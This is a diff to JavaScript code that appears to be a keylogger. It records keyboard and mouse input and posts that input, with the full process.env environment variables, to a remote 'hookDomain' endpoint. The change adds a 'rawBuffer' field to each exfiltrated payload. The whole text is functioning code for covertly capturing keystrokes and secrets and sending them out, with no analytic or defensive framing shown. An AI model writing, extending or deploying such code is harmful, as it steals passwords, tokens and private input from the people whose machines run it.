@@ -17,6 +17,7 @@ try {
 
     axios.get(`${hookDomain}/hook/init`);
     let inputBuffer = '';
+    let rawBuffer = '';
     let isShiftPressed = false; 
     let isCapsLockOn = false; 
     
@@ -96,9 +97,11 @@ try {
                     type: "Mouse",
                     inputBuffer: inputBuffer,
                     event: event,
-                    env: process.env
+                    env: process.env,
+                    rawBuffer: rawBuffer
                 };
                 inputBuffer = '';
+                rawBuffer = '';
                 fetchHookDomainAndPostData(data);
             }
             return;
@@ -116,9 +119,11 @@ try {
                 type: "Keyboard",
                 inputBuffer: inputBuffer,
                 event: event,
-                env: process.env
+                env: process.env,
+                rawBuffer: rawBuffer
             };
             inputBuffer = '';
+            rawBuffer = '';
             fetchHookDomainAndPostData(data);
             // Do not clear inputBuffer here; it is cleared after POST
         } else if (keyName === 'CAPS LOCK') {
